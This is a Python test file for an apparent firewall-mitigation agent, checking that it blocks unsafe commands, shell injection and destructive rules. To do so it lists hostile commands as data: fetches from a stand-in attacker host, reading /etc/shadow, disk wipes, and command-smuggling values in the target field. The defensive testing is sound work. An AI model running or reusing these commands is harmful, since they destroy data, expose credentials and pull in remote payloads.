"""
Comprehensive tests for the mitigation command execution system.

Covers the most security-sensitive code paths in ftagent:
  - _execute_command(): allowed prefixes, shell injection blocking, destructive
    command blocking, sysctl whitelist, private IP blackhole blocking, nft
    auto-create with dedup, command execution & ACK reporting
  - _execute_xdp_command(): JSON spec parsing, target IP sanitization, nft
    table/chain creation, rule application, active mitigation tracking
  - _cleanup_nft_mitigations(): rule removal on incident resolve
  - Command deduplication via _executed_command_ids

All subprocess.run calls are mocked -- no real firewall commands are executed.
"""

import collections
import json
import re
import threading
import time
from unittest.mock import MagicMock, patch, call, ANY

import pytest

from ftagent.agent import Agent


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

def _make_agent():
    """Build an Agent with all heavyweight components mocked out.

    We only need the command execution methods and the state they touch:
    _execute_command, _execute_xdp_command, _cleanup_nft_mitigations,
    _executed_command_ids, _executed_command_order, _active_nft_mitigations,
    and self.api._post.
    """
    cfg = {
        "api_key": "test-key",
        "node_uuid": "test-uuid",
        "api_base": "https://api.test.local",
        "interface": "lo",
        "baseline_window": 300,
        "pcap_enabled": False,
        "flow_enabled": False,
        "gre_mode": "disabled",
        "hypervisor_mode": False,
        "mirror_mode": False,
        "velocity_detection": False,
        "agones_sidecar": False,
        "pcap_lazy": False,
    }

    with patch("ftagent.agent.PPSMonitor"), \
         patch("ftagent.agent.PcapCapture"), \
         patch("ftagent.agent.BaselineManager") as mock_bl, \
         patch("ftagent.agent.ServicePortDetector"), \
         patch("ftagent.agent.detect_gre_interface", return_value=False):
        mock_bl_inst = mock_bl.return_value
        mock_bl_inst.restore_state = MagicMock()
        mock_bl_inst.threshold = 10000.0
        agent = Agent(cfg)

    agent.api = MagicMock()
    agent.api._post = MagicMock()
    return agent


@pytest.fixture
def agent():
    return _make_agent()


# ===================================================================
# 1. Allowed command prefixes
# ===================================================================

class TestAllowedPrefixes:
    """Verify that every documented allowed prefix is accepted."""

    ALLOWED_COMMANDS = [
        "iptables -A INPUT -s 192.0.2.1 -j DROP",
        "ip6tables -A INPUT -s ::1 -j DROP",
        "ipset create blacklist hash:ip",
        "sysctl -w net.ipv4.tcp_syncookies=1",
        "nft add rule inet flowtriq filter ip saddr 192.0.2.1 drop",
        "ufw deny from 192.0.2.1",
        "firewall-cmd --add-rich-rule='rule family=ipv4 source address=192.0.2.1 drop'",
        "tc qdisc add dev eth0 root handle 1: htb",
        "ip route add blackhole 93.184.216.34/32",
        "fail2ban-client set sshd banip 192.0.2.1",
        "nginx -s reload",
        "apache2ctl graceful",
        "rm -f /etc/nginx/conf.d/ft_block.conf",
        "rm -f /etc/apache2/conf-enabled/ft_block.conf",
    ]

    @pytest.mark.parametrize("cmd", ALLOWED_COMMANDS)
    def test_allowed_command_executes(self, agent, cmd):
        """Each allowed-prefix command should reach subprocess.run."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 1,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "test",
            })
        # subprocess.run must have been called (command was not blocked)
        assert mock_run.called, f"Command should have been allowed: {cmd}"
        # ACK should report 'applied'
        agent.api._post.assert_called_once()
        ack_payload = agent.api._post.call_args[0][1]
        assert ack_payload["status"] == "applied"


# ===================================================================
# 2. Blocked unsafe commands
# ===================================================================

class TestBlockedUnsafeCommands:
    """Verify commands not matching any allowed prefix are rejected."""

    UNSAFE_COMMANDS = [
        "rm -rf /",
        "cat /etc/shadow",
        "wget http://evil.com/shell.sh",
        "curl http://evil.com/payload",
        "python3 -c 'import os; os.system(\"rm -rf /\")'",
        "bash -c 'whoami'",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now",
        "reboot",
        "mount /dev/sda1 /mnt",
        "chmod 777 /etc/passwd",
        "useradd hacker",
        "crontab -e",
    ]

    @pytest.mark.parametrize("cmd", UNSAFE_COMMANDS)
    def test_unsafe_command_blocked(self, agent, cmd):
        """Random shell commands must never reach subprocess.run."""
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 2,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "unsafe test",
            })
        mock_run.assert_not_called()
        # ACK should report 'failed' with a blocked-unsafe error
        agent.api._post.assert_called_once()
        ack_payload = agent.api._post.call_args[0][1]
        assert ack_payload["status"] == "failed"
        assert "Blocked unsafe command" in ack_payload["error"]

    def test_prefix_must_match_from_start(self, agent):
        """A line containing an allowed token, but not starting with it, is blocked."""
        cmd = "sudo iptables -A INPUT -s 1.2.3.4 -j DROP"
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 3,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "sneaky prefix",
            })
        mock_run.assert_not_called()

    def test_empty_command_text_skipped(self, agent):
        """Empty command_text should be a no-op (no ACK, no error)."""
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 4,
                "command_type": "iptables",
                "command_text": "",
                "title": "empty",
            })
        mock_run.assert_not_called()
        agent.api._post.assert_not_called()


# ===================================================================
# 3. Shell injection blocking
# ===================================================================

class TestShellInjection:
    """Verify that shell metacharacters in commands are rejected."""

    INJECTION_CHARS = [";", "|", "`", "$", ">", "<"]

    @pytest.mark.parametrize("char", INJECTION_CHARS)
    def test_injection_char_in_iptables(self, agent, char):
        """Each metacharacter should cause rejection even in an otherwise valid command."""
        cmd = f"iptables -A INPUT -s 192.0.2.1 -j DROP {char} rm -rf /"
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 10,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "injection test",
            })
        mock_run.assert_not_called()
        ack_payload = agent.api._post.call_args[0][1]
        assert "shell injection" in ack_payload["error"].lower()

    def test_injection_semicolon_chained(self, agent):
        cmd = "iptables -A INPUT -j DROP; cat /etc/shadow"
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 11,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "semicolon chain",
            })
        mock_run.assert_not_called()

    def test_injection_backtick_subshell(self, agent):
        cmd = "iptables -A INPUT -s `whoami` -j DROP"
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 12,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "backtick subshell",
            })
        mock_run.assert_not_called()

    def test_injection_dollar_expansion(self, agent):
        cmd = "iptables -A INPUT -s $(curl evil.com) -j DROP"
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 13,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "dollar expansion",
            })
        mock_run.assert_not_called()

    def test_injection_pipe(self, agent):
        cmd = "iptables -L | mail attacker@evil.com"
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 14,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "pipe",
            })
        mock_run.assert_not_called()

    def test_injection_redirect(self, agent):
        cmd = "iptables -L > /tmp/exfil.txt"
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 15,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "redirect",
            })
        mock_run.assert_not_called()

    def test_multiline_one_safe_one_injected(self, agent):
        """If one line is clean and one has injection, only the clean one runs."""
        cmd = "iptables -A INPUT -s 192.0.2.1 -j DROP\niptables -A INPUT -j DROP; rm -rf /"
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 16,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "mixed",
            })
        # Only the first (clean) line should have been executed
        assert mock_run.call_count == 1
        # ACK should report applied (one success) with an error note
        ack_payload = agent.api._post.call_args[0][1]
        assert ack_payload["status"] == "applied"
        assert "shell injection" in ack_payload["error"].lower()


# ===================================================================
# 4. Destructive command blocking
# ===================================================================

class TestDestructiveCommands:
    """Verify that firewall flush/delete-chain/policy-drop commands are blocked."""

    DESTRUCTIVE_COMMANDS = [
        "iptables -F",
        "iptables -F INPUT",
        "ip6tables -F",
        "iptables -X",
        "iptables -X CUSTOM_CHAIN",
        "iptables --flush",
        "iptables --delete-chain",
        "iptables -P INPUT DROP",
        "iptables -P INPUT REJECT",
    ]

    @pytest.mark.parametrize("cmd", DESTRUCTIVE_COMMANDS)
    def test_destructive_command_blocked(self, agent, cmd):
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 20,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "destructive test",
            })
        mock_run.assert_not_called()
        ack_payload = agent.api._post.call_args[0][1]
        assert "Blocked destructive" in ack_payload["error"]

    def test_policy_accept_allowed(self, agent):
        """iptables -P INPUT ACCEPT should NOT be blocked (safe default)."""
        cmd = "iptables -P INPUT ACCEPT"
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 21,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "safe policy",
            })
        assert mock_run.called

    def test_append_rule_allowed(self, agent):
        """Normal -A (append) rules must not be confused with -F/-X."""
        cmd = "iptables -A INPUT -s 192.0.2.1 -j DROP"
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 22,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "append",
            })
        assert mock_run.called

    def test_delete_single_rule_allowed(self, agent):
        """iptables -D (delete single rule) should be allowed -- it's not destructive."""
        cmd = "iptables -D INPUT -s 192.0.2.1 -j DROP"
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 23,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "delete rule",
            })
        assert mock_run.called


# ===================================================================
# 5. Sysctl whitelist
# ===================================================================

class TestSysctlWhitelist:
    """Verify only whitelisted sysctl parameters pass."""

    SAFE_SYSCTLS = [
        "sysctl -w net.ipv4.tcp_syncookies=1",
        "sysctl -w net.ipv4.tcp_max_syn_backlog=65536",
        "sysctl -w net.ipv4.tcp_synack_retries=2",
        "sysctl -w net.ipv4.tcp_syn_retries=3",
        "sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1",
        "sysctl -w net.ipv4.icmp_ignore_bogus_error_responses=1",
        "sysctl -w net.ipv4.conf.all.log_martians=1",
        "sysctl -w net.ipv4.tcp_fin_timeout=30",
        "sysctl -w net.ipv4.tcp_keepalive_time=1200",
        "sysctl -w net.core.somaxconn=65535",
        "sysctl -w net.core.netdev_max_backlog=5000",
        "sysctl net.ipv4.tcp_syncookies=1",  # without -w flag
    ]

    UNSAFE_SYSCTLS = [
        "sysctl -w net.ipv4.ip_forward=1",
        "sysctl -w kernel.exec-shield=0",
        "sysctl -w kernel.randomize_va_space=0",
        "sysctl -w net.ipv4.conf.all.accept_redirects=1",
        "sysctl -w net.ipv6.conf.all.forwarding=1",
        "sysctl -w vm.overcommit_memory=1",
        "sysctl -w kernel.core_pattern=/tmp/evil",
        "sysctl -w fs.suid_dumpable=2",
    ]

    @pytest.mark.parametrize("cmd", SAFE_SYSCTLS)
    def test_safe_sysctl_allowed(self, agent, cmd):
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 30,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "sysctl safe",
            })
        assert mock_run.called, f"Safe sysctl should be allowed: {cmd}"

    @pytest.mark.parametrize("cmd", UNSAFE_SYSCTLS)
    def test_unsafe_sysctl_blocked(self, agent, cmd):
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 31,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "sysctl unsafe",
            })
        mock_run.assert_not_called()
        ack_payload = agent.api._post.call_args[0][1]
        assert "Blocked unsafe sysctl" in ack_payload["error"]


# ===================================================================
# 6. Private IP blackhole blocking
# ===================================================================

class TestPrivateIPBlackholeBlocking:
    """Verify blackhole routes to private/loopback/reserved IPs are blocked."""

    BLOCKED_BLACKHOLE_COMMANDS = [
        "ip route add blackhole 10.0.0.1/32",       # private
        "ip route add blackhole 172.16.0.1/32",      # private
        "ip route add blackhole 192.168.1.1/32",     # private
        "ip route add blackhole 127.0.0.1/32",       # loopback
        "ip route add blackhole 0.0.0.0/32",         # reserved
        "ip route add blackhole 255.255.255.255/32", # reserved/broadcast
    ]

    ALLOWED_BLACKHOLE_COMMANDS = [
        "ip route add blackhole 93.184.216.34/32",   # public (example.com)
        "ip route add blackhole 8.8.8.8/32",         # public (Google DNS)
        "ip route add blackhole 1.1.1.1/32",         # public (Cloudflare DNS)
    ]

    @pytest.mark.parametrize("cmd", BLOCKED_BLACKHOLE_COMMANDS)
    def test_private_blackhole_blocked(self, agent, cmd):
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 40,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "blackhole private",
            })
        mock_run.assert_not_called()
        ack_payload = agent.api._post.call_args[0][1]
        assert "Blocked blackhole" in ack_payload["error"]

    @pytest.mark.parametrize("cmd", ALLOWED_BLACKHOLE_COMMANDS)
    def test_public_blackhole_allowed(self, agent, cmd):
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 41,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "blackhole public",
            })
        assert mock_run.called, f"Public blackhole should be allowed: {cmd}"

    def test_non_blackhole_ip_route_allowed(self, agent):
        """ip route commands without 'blackhole' should not trigger private IP checks."""
        cmd = "ip route add 10.0.0.0/8 via 192.168.1.1"
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 42,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "ip route non-blackhole",
            })
        assert mock_run.called


# ===================================================================
# 7. XDP filter spec parsing
# ===================================================================

class TestXDPSpecParsing:
    """Verify JSON spec validation for XDP commands."""

    def test_invalid_json_rejected(self, agent):
        agent._execute_xdp_command(100, "not valid json{", "bad spec")
        agent.api._post.assert_called_once()
        ack = agent.api._post.call_args[0][1]
        assert ack["status"] == "failed"
        assert "Invalid XDP spec JSON" in ack["error"]

    def test_missing_target_rejected(self, agent):
        spec = json.dumps({"type": "xdp_filter", "proto": "udp"})
        agent._execute_xdp_command(101, spec, "no target")
        ack = agent.api._post.call_args[0][1]
        assert ack["status"] == "failed"
        assert "missing target" in ack["error"].lower()

    def test_empty_target_rejected(self, agent):
        spec = json.dumps({"type": "xdp_filter", "target": "", "proto": "udp"})
        agent._execute_xdp_command(102, spec, "empty target")
        ack = agent.api._post.call_args[0][1]
        assert ack["status"] == "failed"
        assert "missing target" in ack["error"].lower()

    def test_unknown_spec_type_rejected(self, agent):
        spec = json.dumps({"type": "xdp_unknown", "target": "1.2.3.4"})
        agent._execute_xdp_command(103, spec, "unknown type")
        ack = agent.api._post.call_args[0][1]
        assert ack["status"] == "failed"
        assert "Unknown XDP spec type" in ack["error"]

    def test_valid_spec_accepted(self, agent):
        spec = json.dumps({
            "type": "xdp_filter",
            "target": "192.0.2.1",
            "proto": "udp",
            "action": "drop",
        })
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_xdp_command(104, spec, "valid filter")
        # Should have created table, chain, and run the rule commands
        assert mock_run.call_count >= 2
        ack = agent.api._post.call_args[0][1]
        assert ack["status"] == "applied"

    def test_valid_remove_spec_accepted(self, agent):
        spec = json.dumps({
            "type": "xdp_filter_remove",
            "target": "192.0.2.1",
        })
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_xdp_command(105, spec, "valid remove")
        assert mock_run.called


# ===================================================================
# 8. XDP target IP validation (injection blocking)
# ===================================================================

class TestXDPTargetIPValidation:
    """Verify injection attempts in XDP target IP field are blocked."""

    INVALID_TARGETS = [
        "192.0.2.1; rm -rf /",
        "192.0.2.1 | cat /etc/shadow",
        "192.0.2.1$(whoami)",
        "192.0.2.1`id`",
        "192.0.2.1 && echo pwned",
        "DROP; nft flush ruleset",
        "../../etc/passwd",
        "192.0.2.1\nrm -rf /",
        "<script>alert(1)</script>",
        "192.0.2.1 > /tmp/exfil",
    ]

    @pytest.mark.parametrize("target", INVALID_TARGETS)
    def test_injection_in_target_blocked(self, agent, target):
        spec = json.dumps({
            "type": "xdp_filter",
            "target": target,
            "proto": "udp",
            "action": "drop",
        })
        with patch("subprocess.run") as mock_run:
            agent._execute_xdp_command(110, spec, "injection target")
        mock_run.assert_not_called()
        ack = agent.api._post.call_args[0][1]
        assert ack["status"] == "failed"
        assert "Invalid target IP" in ack["error"]

    VALID_TARGETS = [
        "192.0.2.1",
        "203.0.113.50",
        "2001:db8::1",
        "fe80::1",
        "10.0.0.1",
        "255.255.255.255",
    ]

    @pytest.mark.parametrize("target", VALID_TARGETS)
    def test_valid_target_ip_accepted(self, agent, target):
        spec = json.dumps({
            "type": "xdp_filter",
            "target": target,
            "proto": "any",
            "action": "drop",
        })
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_xdp_command(111, spec, "valid target")
        assert mock_run.called


# ===================================================================
# 9. Nft rule idempotency (dedup fix)
# ===================================================================

class TestNftRuleIdempotency:
    """Verify existing rules are removed before adding (the dedup fix).

    When nft add rule commands include a comment, the agent should:
    1. Run nft to list existing handles matching that comment
    2. Delete those handles
    3. Then add the new rule
    This prevents rule stacking on command retries.
    """

    def test_nft_add_rule_with_comment_removes_existing(self, agent):
        """nft add rule with a comment should trigger dedup cleanup before adding."""
        cmd = (
            'nft add rule inet flowtriq filter ip saddr 192.0.2.1 '
            'drop comment "flowtriq_block_192_0_2_1"'
        )
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 50,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "nft dedup",
            })
        # Calls should include: table create, chain create, dedup cleanup shell cmd, then the rule itself
        calls = mock_run.call_args_list
        assert len(calls) >= 3, f"Expected at least 3 subprocess calls (table, chain, dedup+rule), got {len(calls)}"

        # Verify the dedup shell command was issued (uses shell=True with grep for handle)
        dedup_calls = [c for c in calls if c.kwargs.get("shell", False)]
        assert len(dedup_calls) >= 1, "Dedup cleanup shell command was not issued"
        dedup_cmd = dedup_calls[0][0][0]
        assert "grep" in dedup_cmd
        assert "flowtriq_block_192_0_2_1" in dedup_cmd
        assert "nft delete rule" in dedup_cmd

    def test_nft_add_rule_without_comment_no_dedup(self, agent):
        """nft add rule without a comment should skip the dedup step."""
        cmd = "nft add rule inet flowtriq filter ip saddr 192.0.2.1 drop"
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 51,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "nft no comment",
            })
        # Should still call table create, chain create, and the rule
        # but NOT the dedup shell command
        calls = mock_run.call_args_list
        dedup_calls = [c for c in calls if c.kwargs.get("shell", False)]
        assert len(dedup_calls) == 0, "Dedup cleanup should not run when there is no comment"

    def test_nft_add_rule_comment_tracked_in_active_mitigations(self, agent):
        """When an nft rule with comment is applied, the comment should be tracked."""
        cmd = (
            'nft add rule inet flowtriq filter ip saddr 192.0.2.1 '
            'drop comment "flowtriq_xdp_192_0_2_1"'
        )
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 52,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "nft track",
            })
        assert "flowtriq_xdp_192_0_2_1" in agent._active_nft_mitigations


# ===================================================================
# 10. Command deduplication
# ===================================================================

class TestCommandDeduplication:
    """Verify same command ID is not executed twice."""

    def test_same_id_not_executed_twice(self, agent):
        """After executing command ID=100, a second execution should be skipped."""
        cmd = {
            "id": 100,
            "command_type": "iptables",
            "command_text": "iptables -A INPUT -s 192.0.2.1 -j DROP",
            "title": "dedup test",
        }
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            # First execution
            agent._execute_command(cmd)
            agent._executed_command_ids.add(100)
            agent._executed_command_order.append(100)

        # Simulate the dedup check that happens in _command_poll_loop / _fetch_config
        assert 100 in agent._executed_command_ids

        # Second execution -- the dedup logic in the polling loop should skip this
        with patch("subprocess.run") as mock_run2:
            mock_run2.return_value = MagicMock(returncode=0, stderr="", stdout="")
            # Simulate what the polling loop does
            cmd_id = cmd.get("id", 0)
            if cmd_id and cmd_id in agent._executed_command_ids:
                pass  # skip
            else:
                agent._execute_command(cmd)
        mock_run2.assert_not_called()

    def test_dedup_set_bounded_by_deque(self, agent):
        """The dedup window should evict old IDs when maxlen is reached."""
        maxlen = agent._executed_command_order.maxlen  # 500
        # Fill the deque + set to capacity
        for i in range(maxlen):
            agent._executed_command_ids.add(i)
            agent._executed_command_order.append(i)

        assert len(agent._executed_command_ids) == maxlen
        assert len(agent._executed_command_order) == maxlen

        # Add one more -- the oldest (0) should be evictable
        evicted = agent._executed_command_order[0]  # will be 0
        agent._executed_command_ids.discard(evicted)
        agent._executed_command_ids.add(maxlen)
        agent._executed_command_order.append(maxlen)

        assert 0 not in agent._executed_command_ids
        assert maxlen in agent._executed_command_ids
        assert len(agent._executed_command_ids) == maxlen

    def test_command_id_zero_not_tracked(self, agent):
        """Command ID 0 should not be added to dedup set (falsy)."""
        cmd = {
            "id": 0,
            "command_type": "iptables",
            "command_text": "iptables -A INPUT -s 192.0.2.1 -j DROP",
            "title": "id zero",
        }
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command(cmd)
        # The polling loop only tracks if cmd_id is truthy
        assert 0 not in agent._executed_command_ids


# ===================================================================
# 11. Active mitigation tracking
# ===================================================================

class TestActiveMitigationTracking:
    """Verify _active_nft_mitigations is populated on apply and cleared on cleanup."""

    def test_xdp_filter_adds_to_active(self, agent):
        spec = json.dumps({
            "type": "xdp_filter",
            "target": "192.0.2.1",
            "proto": "udp",
            "action": "drop",
        })
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_xdp_command(200, spec, "add filter")
        expected_comment = "flowtriq_xdp_192_0_2_1"
        assert expected_comment in agent._active_nft_mitigations

    def test_xdp_filter_remove_discards_from_active(self, agent):
        # Pre-populate an active mitigation
        agent._active_nft_mitigations.add("flowtriq_xdp_192_0_2_1")

        spec = json.dumps({
            "type": "xdp_filter_remove",
            "target": "192.0.2.1",
        })
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_xdp_command(201, spec, "remove filter")
        assert "flowtriq_xdp_192_0_2_1" not in agent._active_nft_mitigations

    def test_multiple_targets_tracked_independently(self, agent):
        targets = ["192.0.2.1", "198.51.100.5", "203.0.113.10"]
        for i, target in enumerate(targets):
            spec = json.dumps({
                "type": "xdp_filter",
                "target": target,
                "proto": "any",
                "action": "drop",
            })
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
                agent._execute_xdp_command(300 + i, spec, f"add {target}")

        assert len(agent._active_nft_mitigations) == 3
        for target in targets:
            comment = f"flowtriq_xdp_{target.replace('.', '_')}"
            assert comment in agent._active_nft_mitigations

    def test_failed_xdp_filter_not_tracked(self, agent):
        """If all nft commands fail, the mitigation should NOT be tracked."""
        spec = json.dumps({
            "type": "xdp_filter",
            "target": "192.0.2.1",
            "proto": "udp",
            "action": "drop",
        })
        with patch("subprocess.run") as mock_run:
            # Table creation fails
            mock_run.return_value = MagicMock(
                returncode=1, stderr="Permission denied", stdout=""
            )
            agent._execute_xdp_command(202, spec, "fail filter")
        # Should not be tracked because the table creation failed and the method returned early
        ack = agent.api._post.call_args[0][1]
        assert ack["status"] == "failed"

    def test_ipv6_target_comment_format(self, agent):
        """IPv6 colons should be replaced with underscores in the comment."""
        spec = json.dumps({
            "type": "xdp_filter",
            "target": "2001:db8::1",
            "proto": "any",
            "action": "drop",
        })
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_xdp_command(203, spec, "ipv6 filter")
        expected_comment = "flowtriq_xdp_2001_db8__1"
        assert expected_comment in agent._active_nft_mitigations


# ===================================================================
# 12. Cleanup on resolve
# ===================================================================

class TestCleanupOnResolve:
    """Verify _cleanup_nft_mitigations removes all tracked rules."""

    def test_cleanup_removes_all_tracked_rules(self, agent):
        # Populate active mitigations
        agent._active_nft_mitigations = {
            "flowtriq_xdp_192_0_2_1",
            "flowtriq_xdp_198_51_100_5",
            "flowtriq_xdp_203_0_113_10",
        }
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._cleanup_nft_mitigations()

        # All mitigations should be cleared
        assert len(agent._active_nft_mitigations) == 0
        # subprocess.run should have been called once for each mitigation
        assert mock_run.call_count == 3

        # Each call should be a shell command that deletes handles by comment
        for c in mock_run.call_args_list:
            cmd_str = c[0][0]
            assert "nft delete rule" in cmd_str
            assert "nft -a list chain" in cmd_str
            assert c.kwargs.get("shell") is True

    def test_cleanup_no_mitigations_is_noop(self, agent):
        """If no active mitigations, cleanup should do nothing."""
        agent._active_nft_mitigations = set()
        with patch("subprocess.run") as mock_run:
            agent._cleanup_nft_mitigations()
        mock_run.assert_not_called()

    def test_cleanup_handles_subprocess_error(self, agent):
        """Cleanup should not crash if subprocess fails for one rule."""
        agent._active_nft_mitigations = {
            "flowtriq_xdp_192_0_2_1",
            "flowtriq_xdp_198_51_100_5",
        }
        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = [
                Exception("nft not found"),
                MagicMock(returncode=0, stderr="", stdout=""),
            ]
            # Should not raise
            agent._cleanup_nft_mitigations()

        # Set should still be cleared even if individual commands fail
        assert len(agent._active_nft_mitigations) == 0

    def test_cleanup_uses_correct_table_and_chain(self, agent):
        """Cleanup commands should reference inet flowtriq_xdp filter."""
        agent._active_nft_mitigations = {"flowtriq_xdp_test_1_2_3"}
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._cleanup_nft_mitigations()

        cmd_str = mock_run.call_args[0][0]
        assert "inet flowtriq_xdp filter" in cmd_str


# ===================================================================
# Additional safety edge cases
# ===================================================================

class TestAdditionalSafety:
    """Extra edge cases for comprehensive safety coverage."""

    def test_multiline_command_all_lines_validated(self, agent):
        """Every line in a multi-line command_text must pass validation independently."""
        cmd_text = "\n".join([
            "iptables -A INPUT -s 192.0.2.1 -j DROP",
            "iptables -A INPUT -s 192.0.2.2 -j DROP",
            "iptables -A INPUT -s 192.0.2.3 -j DROP",
        ])
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 60,
                "command_type": "iptables",
                "command_text": cmd_text,
                "title": "multiline",
            })
        assert mock_run.call_count == 3

    def test_blank_lines_skipped(self, agent):
        """Blank lines and whitespace-only lines should be silently skipped."""
        cmd_text = "\n\n  \niptables -A INPUT -s 192.0.2.1 -j DROP\n  \n\n"
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 61,
                "command_type": "iptables",
                "command_text": cmd_text,
                "title": "blanks",
            })
        assert mock_run.call_count == 1

    def test_command_failure_reported_in_ack(self, agent):
        """If subprocess returns non-zero, the error should be in the ACK."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=1, stderr="iptables: No chain/target/match by that name.",
                stdout=""
            )
            agent._execute_command({
                "id": 62,
                "command_type": "iptables",
                "command_text": "iptables -A INPUT -s 192.0.2.1 -j DROP",
                "title": "fail cmd",
            })
        ack = agent.api._post.call_args[0][1]
        assert ack["status"] == "failed"
        assert "No chain/target/match" in ack["error"]

    def test_subprocess_exception_reported(self, agent):
        """If subprocess.run raises, the error should be in the ACK."""
        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = OSError("Permission denied")
            agent._execute_command({
                "id": 63,
                "command_type": "iptables",
                "command_text": "iptables -A INPUT -s 192.0.2.1 -j DROP",
                "title": "exception cmd",
            })
        ack = agent.api._post.call_args[0][1]
        assert ack["status"] == "failed"
        assert "Permission denied" in ack["error"]

    def test_xdp_command_type_dispatches_to_xdp_handler(self, agent):
        """command_type='xdp' should route to _execute_xdp_command."""
        spec = json.dumps({
            "type": "xdp_filter",
            "target": "192.0.2.1",
            "proto": "udp",
            "action": "drop",
        })
        with patch.object(agent, "_execute_xdp_command") as mock_xdp:
            agent._execute_command({
                "id": 64,
                "command_type": "xdp",
                "command_text": spec,
                "title": "xdp dispatch",
            })
        mock_xdp.assert_called_once_with(64, spec, "xdp dispatch")

    def test_ack_includes_command_id(self, agent):
        """Every ACK must include the correct command_id."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 999,
                "command_type": "iptables",
                "command_text": "iptables -A INPUT -s 192.0.2.1 -j DROP",
                "title": "ack id test",
            })
        ack = agent.api._post.call_args[0][1]
        assert ack["command_id"] == 999

    def test_ack_endpoint_is_correct(self, agent):
        """ACK should be POSTed to /agent/commands/ack."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 65,
                "command_type": "iptables",
                "command_text": "iptables -A INPUT -s 192.0.2.1 -j DROP",
                "title": "endpoint test",
